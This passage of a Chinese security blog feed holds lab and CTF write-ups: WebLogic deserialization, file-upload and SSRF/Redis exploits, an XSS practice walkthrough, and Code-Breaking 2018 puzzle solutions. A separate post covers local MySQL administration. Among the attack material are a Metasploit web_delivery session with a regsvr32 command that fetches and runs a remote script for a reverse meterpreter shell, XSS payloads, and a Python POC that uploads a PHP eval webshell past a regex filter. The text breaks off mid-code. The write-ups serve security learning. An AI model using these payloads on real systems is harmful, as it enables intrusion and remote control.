Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。</p><h3 id="相关介绍-10"><a href="#相关介绍-10" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可<strong>导致未授权的用户在远程服务器执行任意命令。</strong></p><h3 id="漏洞复现-10"><a href="#漏洞复现-10" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>服务器重装了<code>docker</code>和<code>docker-compose</code>。<br>访问<code>http://47.103.117.169:22312/console</code>，环境需要配置，等待即可。<br>直接使用工具：</p><ul><li><ol><li>验证有无该漏洞<br>这一步失败了，脚本执行不成功。不管它</li></ol></li><li><ol start="2"><li>上传shell<br>k8gege提供了两种方法：<code>.NET的GUI界面</code>和<code>命令行界面</code>（偏爱GUI）<br><img src="./hanX4FF.png" alt><br><img src="./KRXYwHh.png" alt></li></ol></li><li><ol start="3"><li>getshell<br>这里有点问题，服务端的问题。<br>这个shell上传之后，执行一次命令就会失效，所以采用反弹shell。<br>命令执行使用：<br>K8飞刀<br><img src="./dcDyGjC.png" alt><br>脚本：<br><img src="./kf9ZcDK.png" alt></li></ol></li><li><ol start="4"><li><p>获得meterpreter</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/script/web_delivery </span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> target 3</span><br><span class="line">target =&gt; 3</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> lhost 192.168.91.148</span><br><span class="line">lhost =&gt; 192.168.91.148</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> lport 2333</span><br><span class="line">lport =&gt; 2333</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; exploit </span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.91.148:2333 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/ei8mHaBXvn4n</span><br><span class="line">[*] Local IP: http://192.168.91.148:8080/ei8mHaBXvn4n</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.91.148:8080/ei8mHaBXvn4n.sct scrobj.dll</span><br></pre></td></tr></table></figure><p>然后目标cmd执行：<code>regsvr32 /s /n /u /i:http://192.168.91.148:8080/ei8mHaBXvn4n.sct scrobj.dll</code><br><code>sessions -i 1</code> 进入meterpreter即可<br>注意：以上是针对Windows系统。<code>lhost</code> <code>lport</code>设置为自己的IP和port，由于题目是放在公网上的，而我的另一台攻击服务器没有安装msf，故无法复现。</p></li></ol></li></ul><h3 id="知识总结-10"><a href="#知识总结-10" class="headerlink" title="知识总结"></a>知识总结</h3><p>真好玩</p><h2 id="Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>Weblogic 任意文件上传漏洞（CVE-2018-2894）</h2><h3 id="相关介绍-11"><a href="#相关介绍-11" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，<code>Web Service Test Page</code> <strong>在“生产模式”下默认不开启，所以该漏洞有一定限制。</strong></p><p>利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。</p><h3 id="漏洞复现-11"><a href="#漏洞复现-11" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个漏洞环境真的是，sad <strong>.<code>_</code>.</strong><br>漏洞的利用需要登录到控制台界面，查看weblogic登陆密码如下图：<br><img src="./VQvYoL2.png" alt></p><p>登录后台页面，点击<code>base_domain</code>的配置，在“高级”中开启“启用 Web 服务测试页”选项：<br><img src="./CsKUfX7.png" alt></p><p>访问<code>http://47.103.117.169:22313/ws_utc/config.do</code>，设置<code>Work Home Dir</code>为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。要将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。<br><img src="./vxxF6zN.png" alt></p><p>然后点击安全 -&gt; 增加，然后上传webshell<br><strong>图略</strong></p><hr><p>上传后，查看返回的数据包，返回的XML中有时间戳<br>然后访问<code>http://47.103.117.169:22313/ws_utc/css/config/keystore/[时间戳]_[文件名]</code>，即可执行webshell<br><strong>无图</strong>sad<br>jsp马真的是。。<br>上传了好几个都不行，马中包含中文都编译不了。。<br>放弃，不像<code>tomcat</code>后台那个洞一样舒服！</p><h3 id="知识总结-11"><a href="#知识总结-11" class="headerlink" title="知识总结"></a>知识总结</h3><p>玩得不开心，没有总结。</p><h2 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h2><h3 id="相关介绍-12"><a href="#相关介绍-12" class="headerlink" title="相关介绍"></a>相关介绍</h3><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击<code>内网</code>中redis、fastcgi等脆弱组件。</p><h3 id="漏洞复现-12"><a href="#漏洞复现-12" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>根据P神的漏洞环境，直接访问<code>http://47.103.117.169:22314/uddiexplorer/SearchPublicRegistries.jsp</code>，利用burp抓包修改某些参数，即可达到ssrf的目的。</p><p>关键参数：<code>operator</code><br>探测一个开放的端口<br><img src="./e1R4ApP.png" alt></p><p>当修改参数为一个不存在的端口时，返回的响应数据不同，或者迟迟没有响应。</p><blockquote><p>通过错误的不同，即可探测内网状态。</p></blockquote><p><strong>注入HTTP头，利用Redis反弹shell</strong></p><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个”GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。<br>redis服务的默认端口为<code>6379</code><br>在docker的内网中已经安装好redis服务，docker0的内网IP为<code>172.18.0.1</code><br><img src="./23iJqT7.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>对本地三个MySQL数据库进行管理</title>
      <link href="/passages/2019-6-12-%E5%AF%B9%E6%9C%AC%E5%9C%B0%E4%B8%89%E4%B8%AAMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9B%E8%A1%8C%E7%AE%A1%E7%90%86/"/>
      <url>/passages/2019-6-12-%E5%AF%B9%E6%9C%AC%E5%9C%B0%E4%B8%89%E4%B8%AAMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9B%E8%A1%8C%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>三个数据库：</p><ul><li>本地安装</li><li>wamp</li><li>phpstudy（最近为了看乌云漏洞库才安装，也发现了一大堆问题）</li></ul></blockquote><a id="more"></a><h2 id="安装的独立MySQL"><a href="#安装的独立MySQL" class="headerlink" title="安装的独立MySQL"></a>安装的独立MySQL</h2><p>之前学习MySQL时还没有安装集成环境，用得也挺舒服的。<br>安装好后会在系统服务中添加MySQL服务，开启命令：<code>net start mysql</code>，但现在对我来说已经没用了。<br>bin目录下的 <code>mysqld-nt.exe</code> 也就是启动MySQL服务用的。</p><h2 id="wamp的MySQL"><a href="#wamp的MySQL" class="headerlink" title="wamp的MySQL"></a>wamp的MySQL</h2><p>wamp也还可以，就是版本太少了，迫不得已转战phpstudy。<br>当时安装好wamp后，也没遇到什么大问题，只是有时候系统的MySQL服务没关，导致连接不上，关掉即可（命令关闭或者服务中关闭）。</p><h2 id="phpstudy的MySQL"><a href="#phpstudy的MySQL" class="headerlink" title="phpstudy的MySQL"></a>phpstudy的MySQL</h2><p>安装好后就是不能启动MySQL服务，查询资料解释如下：</p><blockquote><p>可能是之前已经装过Mysql，要把系统服务里面的MySQL删除，留下MySQLa服务。<br>在cmd命令行下输入：<code>sc delete mysql</code> 即可删除。</p></blockquote><p>的确，这样就能够启动phpstudy自带的MySQL服务了。但是原先系统安装的MySQL服务给删除了，不方便一键启动了，毕竟做项目啥的数据库文件还是喜欢放在本地第一次安装的MySQL中，因为扩展多，支持的功能多（<del>我也没有项目可做！</del>）。</p><h2 id="分别启动三个MySQL服务"><a href="#分别启动三个MySQL服务" class="headerlink" title="分别启动三个MySQL服务"></a>分别启动三个MySQL服务</h2><p>首先，命令行下输入 <code>mysql -uroot -p</code> 就可以连接一个本地的MySQL服务。</p><h3 id="连接wamp的MySQL"><a href="#连接wamp的MySQL" class="headerlink" title="连接wamp的MySQL"></a>连接wamp的MySQL</h3><p>首先打开任务管理器，看一下其他的MySQL服务是不是还在运行，一般是在详细信息中显示 <code>mysqld.exe</code> 或者 <code>mysqld-nt.exe</code> 。<br>确保没有其他正在运行就直接打开wamp，它就会运行MySQL服务，直接命令行下 <code>mysql -uroot -p</code> 就可连接。<br><strong>记住退出wamp之前将所有服务先关闭。</strong></p><h3 id="连接phpstudy的MySQL服务"><a href="#连接phpstudy的MySQL服务" class="headerlink" title="连接phpstudy的MySQL服务"></a>连接phpstudy的MySQL服务</h3><p>同样先查看有没有其他MySQL服务正在运行。还有就是得删除原先系统安装的MySQL服务。<br>运行phpstudy后就命令行下连接MySQL。<br><strong>记住退出phpstudy之前将所有服务先关闭。</strong></p><h3 id="连接系统安装的MySQL服务"><a href="#连接系统安装的MySQL服务" class="headerlink" title="连接系统安装的MySQL服务"></a>连接系统安装的MySQL服务</h3><p>首先确保没有其他MySQL服务在运行，有的话直接kill。<br>然后找到 <code>bin</code> 目录下的 <code>mysql-nt.exe</code> ，双击运行。命令行下运行也可，但是会占用当前命令行。</p><p><img src="./1.png" alt></p><p>命令连接MySQL服务即可。</p><p>同样，记得关闭这个服务，直接在任务管理器中暴力kill。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS练习笔记</title>
      <link href="/passages/2019-03-25-XSS%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/passages/2019-03-25-XSS%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>一个基础的、面向新手的XSS靶场</p></blockquote><p><img src="/xss.png" alt></p><a id="more"></a><h1 id="XSS练习笔记"><a href="#XSS练习笔记" class="headerlink" title="XSS练习笔记"></a>XSS练习笔记</h1><p>XSS基础知识：<br><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">https://portswigger.net/web-security/cross-site-scripting</a></p><p>练习靶场：<br><a href="https://brutelogic.com.br/xss.php" target="_blank" rel="noopener">https://brutelogic.com.br/xss.php</a></p><p>官方WP：<br><a href="https://brutelogic.com.br/blog/the-7-main-xss-cases-everyone-should-know/" target="_blank" rel="noopener">https://brutelogic.com.br/blog/the-7-main-xss-cases-everyone-should-know/</a></p><h2 id="1-URL-Reflection"><a href="#1-URL-Reflection" class="headerlink" title="1. URL Reflection"></a>1. URL Reflection</h2><p>当URL以某种方式显示在源代码中时，我们可以添加自己的<code>XSS向量</code>或者<code>payload</code>。对于PHP页面，可以<strong>使用斜杠字符</strong> <code>/</code> 在页面名称之后添加任何内容（不更改它）。</p><p><img src="rAdL61s.png" alt><br>如上图，URL的值会显示在<code>action</code>属性中<br>payload：<code>http://brutelogic.com.br/xss.php/&quot;&gt;&lt;svg onload=alert(1)&gt;</code></p><h2 id="2-Simple-HTMLi-HTML-injection"><a href="#2-Simple-HTMLi-HTML-injection" class="headerlink" title="2. Simple HTMLi (HTML injection)"></a>2. Simple HTMLi (HTML injection)</h2><p>输入的内容在现有标签之间。没有过滤任何东西。<br><img src="zAUOs5P.png" alt><br>如上图，<code>guest</code>的值就是参数<code>a</code>的值。<br>payload：<code>http://brutelogic.com.br/xss.php?a=&lt;svg onload=alert(1)&gt;</code></p><h2 id="3-Inline-HTMLi-Double-Quotes"><a href="#3-Inline-HTMLi-Double-Quotes" class="headerlink" title="3. Inline HTMLi (Double Quotes)"></a>3. Inline HTMLi (Double Quotes)</h2><p>可以使用<code>&quot;&gt;</code>将其闭合。<br><img src="FAD1ytQ.png" alt><br>payload：<code>http://brutelogic.com.br/xss.php?b1=&quot;&gt;&lt;svg onload=alert(1)&gt;</code></p><h2 id="4-Inline-HTMLi-Single-Quotes"><a href="#4-Inline-HTMLi-Single-Quotes" class="headerlink" title="4. Inline HTMLi (Single Quotes)"></a>4. Inline HTMLi (Single Quotes)</h2><p>跟上面一样，使用<code>&#39;&gt;</code>进行闭合<br><img src="DRvisKI.png" alt><br>payload：<code>https://brutelogic.com.br/xss.php?b2=&#39;&gt;&lt;svg onload=alert(1)&gt;</code></p><h2 id="5-Inline-HTMLi-No-Tag-Breaking-Double-Quotes"><a href="#5-Inline-HTMLi-No-Tag-Breaking-Double-Quotes" class="headerlink" title="5. Inline HTMLi - No Tag Breaking (Double Quotes)"></a>5. Inline HTMLi - No Tag Breaking (Double Quotes)</h2><p>该内联HTML注入中转义了<code>&gt;</code>不能像上一关那样使用<code>&quot;&gt;</code>闭合</p><p><img src="Vue05Vr.png" alt></p><p>可以<code>&quot;</code>闭合后，增加一个<code>onmouseover</code>属性<br>payload：<code>http://brutelogic.com.br/xss.php?b3=&quot; onmouseover=alert(1)//</code></p><blockquote><p>双斜线注释掉<code>&quot;</code></p></blockquote><p>演示结果：<br><img src="BS0cNvE.png" alt></p><p>也可以使用<code>&quot;alert(1)&quot;</code><br>payload：<code>http://brutelogic.com.br/xss.php?b3=&quot; onmouseover=&quot;alert(1)</code></p><p>演示结果：<br><img src="v21UcYg.png" alt></p><h2 id="6-Inline-HTMLi-No-Tag-Breaking-Single-Quotes"><a href="#6-Inline-HTMLi-No-Tag-Breaking-Single-Quotes" class="headerlink" title="6. Inline HTMLi - No Tag Breaking (Single Quotes)"></a>6. Inline HTMLi - No Tag Breaking (Single Quotes)</h2><p>同上<br>payload：<code>http://brutelogic.com.br/xss.php?b4=&#39; onmouseover=alert(1)//</code><br>payload：<code>http://brutelogic.com.br/xss.php?b4=&#39; onmouseover=&#39;alert(1)</code></p><h2 id="7-HTMLi-in-Js-Block-Single-Quotes"><a href="#7-HTMLi-in-Js-Block-Single-Quotes" class="headerlink" title="7. HTMLi in Js Block (Single Quotes)"></a>7. HTMLi in Js Block (Single Quotes)</h2><p>输入有时会进入一个javascript块（脚本标签），通常是代码的某个变量的值。<br>但是因为<strong>HTML标签在浏览器的解析中具有优先权</strong>，所以我们可以简单地终止JS块并插入新标签。</p><p><img src="JKhLB3x.png" alt></p><p>payload：<code>http://brutelogic.com.br/xss.php?c1=&lt;/script&gt;&lt;svg onload=alert(1)&gt;</code></p><h2 id="8-HTMLi-in-Js-Block-Double-Quotes"><a href="#8-HTMLi-in-Js-Block-Double-Quotes" class="headerlink" title="8. HTMLi in Js Block (Double Quotes)"></a>8. HTMLi in Js Block (Double Quotes)</h2><p>同上<br>payload：<code>http://brutelogic.com.br/xss.php?c2=&lt;/script&gt;&lt;svg onload=alert(1)&gt;</code></p><h2 id="9-Simple-Js-Injection-Single-Quotes"><a href="#9-Simple-Js-Injection-Single-Quotes" class="headerlink" title="9. Simple Js Injection (Single Quotes)"></a>9. Simple Js Injection (Single Quotes)</h2><p>跟上一关的情况类似，输入的值显示在JS代码块中，但是过滤了<code>&lt;</code>，无法使用<code>&lt;/script&gt;</code>闭合JS代码块。<br>所以要进行的是注入javascript代码，并且注意语法。方法是<strong>连接</strong>我们想要执行的代码，使用<code>-</code>连接。单引号进行闭合。</p><p>payload：<code>http://brutelogic.com.br/xss.php?c3=&#39;-alert(1)-&#39;</code></p><p>演示结果：<br><img src="ssLX7bt.png" alt></p><h2 id="10-Simple-Js-Injection-Double-Quotes"><a href="#10-Simple-Js-Injection-Double-Quotes" class="headerlink" title="10. Simple Js Injection (Double Quotes)"></a>10. Simple Js Injection (Double Quotes)</h2><p>同上<br>payload：<code>http://brutelogic.com.br/xss.php?c4=&quot;-alert(1)-&quot;</code></p><h2 id="11-Escaped-Js-Injection-Single-Quotes"><a href="#11-Escaped-Js-Injection-Single-Quotes" class="headerlink" title="11. Escaped Js Injection (Single Quotes)"></a>11. Escaped Js Injection (Single Quotes)</h2><p>该题中，对输入的<code>&#39;</code>进行了转义：<code>&#39;</code>–&gt;<code>\&#39;</code>，就直接输出了<code>&#39;</code>，而无法注入。<br>可以输入在<code>&#39;</code>前输入<code>\</code>，使得转义后变成<code>\\&#39;</code>，那么最终输出的值为<code>\</code>，而<code>&#39;</code>不作为值。必要时需要使用<code>//</code>注释掉后面多余的字符。<br>payload：<code>http://brutelogic.com.br/xss.php?c5=\&#39;-alert(1)//</code></p><p>演示结果：<br><img src="ZsdyJbm.png" alt></p><h2 id="12-Escaped-Js-Injection-Double-Quotes"><a href="#12-Escaped-Js-Injection-Double-Quotes" class="headerlink" title="12. Escaped Js Injection (Double Quotes)"></a>12. Escaped Js Injection (Double Quotes)</h2><p>同上</p><p>payload：<code>http://brutelogic.com.br/xss.php?c6=\&quot;-alert(1)//</code></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Code-Breaking Puzzles 2018 做题记录</title>
      <link href="/passages/Code-Breaking2018/"/>
      <url>/passages/Code-Breaking2018/</url>
      
        <content type="html"><![CDATA[<blockquote><p>P神的Code-Breaking Puzzles 2018 全都是好题目。<br>项目地址：<a href="https://github.com/phith0n/code-breaking" target="_blank" rel="noopener">https://github.com/phith0n/code-breaking</a></p></blockquote><a id="more"></a><h2 id="一-easy-–-function"><a href="#一-easy-–-function" class="headerlink" title="一. easy – function"></a>一. easy – function</h2><p>源码审计：<br><img src="./1-1.png" alt></p><p>思路很清晰，想办法在函数名的头或者尾找一个字符，不影响函数调用。<br>可以使用burpsuite来fuzz。</p><p><strong>知识点一</strong>：<br>在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名<code>function_name()</code>调用，调用的时候其实<code>相当于写了一个相对路径</code>；而如果写<code>\function_name()</code> 这样调用函数，则<code>其实是写了一个绝对路径</code>。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p><p>接下来就是要找到一个神奇的可控的函数。<br><strong>知识点二</strong>：<br>可以用<code>create_function</code>来完成，<code>create_function</code>的第一个参数是参数，第二个参数是内容。<br>函数结构形似：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$a,$b'</span>,<span class="string">'return 111'</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后执行，如果我们想要执行任意代码，<code>就首先需要跳出这个函数定义</code>。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reate_function(<span class="string">'$a,$b'</span>,<span class="string">'return 111;&#125;phpinfo();//'</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;&#125;phpinfo();<span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用payload如下<br><img src="./1-2.png" alt></p><p><strong>长姿势</strong>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$handler=opendir(<span class="string">'../'</span>);</span><br><span class="line"><span class="keyword">while</span>(($filename=readdir($handler))!==<span class="keyword">false</span>)</span><br><span class="line">    &#123;<span class="keyword">echo</span> $filename.<span class="string">"&lt;br/&gt;"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>利用上述php代码可以<strong>遍历服务器中某一目录的文件</strong>。</p><h2 id="二-easy-–-pcrewaf"><a href="#二-easy-–-pcrewaf" class="headerlink" title="二. easy – pcrewaf"></a>二. easy – pcrewaf</h2><p><strong>PHP利用PCRE回溯次数限制绕过某些安全限制</strong></p><p>源码审计：<br><img src="./2-1.png" alt></p><p>看了WP后，实在是长姿势，偷偷记下来。(带水印的图片均来自P神的原图)</p><h3 id="2-1-正则表达式介绍"><a href="#2-1-正则表达式介绍" class="headerlink" title="2.1 正则表达式介绍"></a>2.1 正则表达式介绍</h3><p>正则表达式是一个可以被“有限状态自动机”接受的语言类。</p><p>“有限状态自动机”，其拥有有限数量的状态，每个状态可以迁移到零个或多个状态，输入字串决定执行哪个状态的迁移。而常见的正则引擎，又被细分为<strong>DFA</strong>（确定性有限状态自动机）与<strong>NFA</strong>（非确定性有限状态自动机）。他们匹配输入的过程分别是：</p><ul><li><p>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</p></li><li><p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态由于NFA的执行过程存在回溯，所以其性能会劣于DFA，但它支持更多功能。<strong>大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。</strong></p></li></ul><h3 id="2-2-NFA执行的回溯过程"><a href="#2-2-NFA执行的回溯过程" class="headerlink" title="2.2 NFA执行的回溯过程"></a>2.2 NFA执行的回溯过程</h3><p>所以，我们题目中的正则<code>&lt;\?.*[(`;?&gt;].*</code>，假设匹配的输入是<code>&lt;?php phpinfo();//aaaaa</code>,实际执行流程是这样的：<br><img src="./2-2.png" alt></p><p>（正则表达式在线调试：<a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com/</a> ）<br>（正则表达式查找手册：<a href="http://tool.oschina.net/uploads/apidocs/jquery/regexp.html" target="_blank" rel="noopener">http://tool.oschina.net/uploads/apidocs/jquery/regexp.html</a> ）</p><p>见上图，可见第4步的时候，因为第一个<code>.*</code>可以匹配任何字符，所以最终匹配到了输入串的结尾，也就是<code>//aaaaa</code>。但此时显然是不对的，因为正则显示<code>.*</code>后面还应该有一个字符<code>[(`;?&gt;]</code>。</p><p>所以NFA就开始回溯，先吐出一个<code>a</code>，输入变成第5步显示的<code>//aaaa</code>，但仍然匹配不上正则，继续吐出<code>a</code>，变成<code>//aaa</code>，仍然匹配不上……</p><p>最终直到吐出<code>;</code>，输入变成第12步显示的<code>&lt;?php phpinfo()</code>，此时，<code>.*</code>匹配的是<code>php phpinfo()</code>，而后面的<code>;</code>则匹配上<code>[(`;?&gt;]</code>，这个结果满足正则表达式的要求，于是不再回溯。13步开始向后匹配<code>;</code>，14步匹配<code>.*</code>，第二个<code>.*</code>匹配到了字符串末尾，最后结束匹配。</p><h3 id="2-3-PHP的pcre-backtrack-limit限制利用"><a href="#2-3-PHP的pcre-backtrack-limit限制利用" class="headerlink" title="2.3 PHP的pcre.backtrack_limit限制利用"></a>2.3 PHP的pcre.backtrack_limit限制利用</h3><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：<br><img src="./2-3.png" alt></p><p>可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万，会出现什么现象呢？比如：<br><img src="./2-4.png" alt></p><p>可见，preg_match返回的非1和0，而是false。</p><p>所以本题的POC为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">b'aaa&lt;?php eval($_POST[txt]);//'</span> + <span class="string">b'a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://47.112.16.34:8071/'</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(res.headers)  <span class="comment">#响应头显示文件位置</span></span><br></pre></td></tr></table></figure><h3 id="2-4-FILES全局变量介绍及用法"><a href="#2-4-FILES全局变量介绍及用法" class="headerlink" title="2.4 $_FILES全局变量介绍及用法"></a>2.4 $_FILES全局变量介绍及用法</h3><p>此数组包含有所有上传的文件信息。<br>看一个例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- The data encoding type, enctype, MUST be specified <span class="keyword">as</span> below --&gt;</span><br><span class="line">&lt;form enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"__URL__"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    &lt;!-- MAX_FILE_SIZE must precede the file input field --&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"30000"</span> /&gt;</span><br><span class="line">    &lt;!-- Name of input element determines name in $_FILES <span class="keyword">array</span> --&gt;</span><br><span class="line">    Send this file: &lt;input name=<span class="string">"userfile"</span> type=<span class="string">"file"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Send File"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>Note:<br>要确保文件上传表单的属性是 enctype=”multipart/form-data”，否则文件上传不了。 </p></blockquote><p>MAX_FILE_SIZE 隐藏字段（单位为字节）必须放在文件输入字段之前，其值为接收文件的最大尺寸。这是对浏览器的一个建议，PHP 也会检查此项。</p><p>以上范例中 $_FILES 数组的内容如下所示。我们假设文件上传字段的名称如上例所示，为 userfile。名称可随意命名。</p><p>$_FILES[‘userfile’][‘name’]</p><blockquote><p>客户端机器文件的原名称。</p></blockquote><p>$_FILES[‘userfile’][‘type’]</p><blockquote><p>文件的 MIME 类型，如果浏览器提供此信息的话。一个例子是“image/gif”。不过此 MIME 类型在 PHP 端并不检查，因此不要想当然认为有这个值。</p></blockquote><p>$_FILES[‘userfile’][‘size’]</p><blockquote><p>已上传文件的大小，单位为字节。</p></blockquote><p>$_FILES[‘userfile’][‘tmp_name’]</p><blockquote><p>文件被上传后在服务端储存的临时文件名。</p></blockquote><p>$_FILES[‘userfile’][‘error’]</p><blockquote><p>和该文件上传相关的错误代码。此项目是在 PHP 4.2.0 版本中增加的。</p></blockquote><h3 id="2-5-requests模块中POST一个多部分编码-Multipart-Encoded-的文件"><a href="#2-5-requests模块中POST一个多部分编码-Multipart-Encoded-的文件" class="headerlink" title="2.5 requests模块中POST一个多部分编码(Multipart-Encoded)的文件"></a>2.5 requests模块中POST一个多部分编码(Multipart-Encoded)的文件</h3><p>Requests 使得上传多部分编码文件变得很简单：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: open(<span class="string">'report.xls'</span>, <span class="string">'rb'</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span 